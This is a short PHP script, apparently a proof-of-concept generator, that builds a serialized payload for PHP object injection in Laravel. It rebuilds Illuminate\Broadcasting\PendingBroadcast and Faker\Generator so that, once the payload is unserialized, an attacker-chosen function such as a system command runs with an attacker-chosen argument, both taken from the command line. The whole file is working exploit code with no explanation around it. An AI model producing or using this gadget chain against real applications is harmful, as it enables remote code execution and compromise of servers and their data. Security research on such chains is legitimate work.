<?php


namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        function __construct($events, $cmd)
        {
            $this->events = $events;
            $this->event = $cmd;
        }
    }
}


namespace Faker
{
    class Generator
    {
        protected $formatters;

        function __construct($function)
        {
            $this->formatters = ['dispatch' => $function];
        }
    }
}

namespace Y4tacker
{
    class Exp{
        public function generate($function, $parameter)
        {

            return serialize(new \Illuminate\Broadcasting\PendingBroadcast(
                new \Faker\Generator($function), $parameter
            ));
        }
    }
}

namespace {
    
    $function = $argv[1];
    $parameter = $argv[2];
    $a = new \Y4tacker\Exp();
    $b = $a->generate($function,$parameter);
    echo $b;

}
